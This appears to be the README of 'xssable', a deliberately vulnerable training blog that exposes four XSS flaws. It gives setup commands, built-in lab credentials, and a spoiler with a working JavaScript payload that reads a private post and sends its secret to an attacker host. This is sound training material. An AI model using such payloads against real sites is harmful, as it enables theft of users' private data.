## xssable

xssable is a vulnerable blogging platform used to demonstrate XSS vulnerabilities. 

### Usage

To run it locally:

```
docker build . -t xssable:latest
docker run -p 5000:5000 xssable:latest
```

or 

```bash
pip install -r requirements.txt
python app.py
```

Then access the application on http://127.0.0.1:5000.

<details>
 <summary>Spoiler!</summary>

Credentials for the built-in user accounts are `John:12345` and `Connie:iloveyou1`.

</details>

Currently there are 4 different XSS vulnerabilities:

- a reflected XSS (with the possibility to bypass Chrome's XSS Auditor),
- a stored XSS with limited exploitation,
- a stored XSS without limitations, and
- a `location.hash` to `.innerHTML` based DOM XSS.

Exploitation (beyond alert() pop-ups) can be practiced by getting access to Connie's private blog post and stealing the secret code.

<details>
 <summary>Spoiler!</summary>
 
```js
fetch('/blogs').then(r => r.text()).then(t => fetch('https://attacker.kiwi.com/?s='%2bt.split('%F0%9F%94%92')[1].split('<strong>')[1].split('<')[0]))</script>
```

</details>
&nbsp;

The application highlights that:

- blacklists are bypass-able,
- browser protections are unreliable,
- not every "XSS" has the same impact,
- frameworks do unexpected stuff, and
- server-side validation is important.

##### What's next?

- https://xss-game.appspot.com/ - good for basics, created by Google.
- https://knock.xss.moe - focused on exploitation and filter evasion.
- https://polyglot.innerht.ml/ - an awesome polyglot challenge (it's over by now and the results are public).
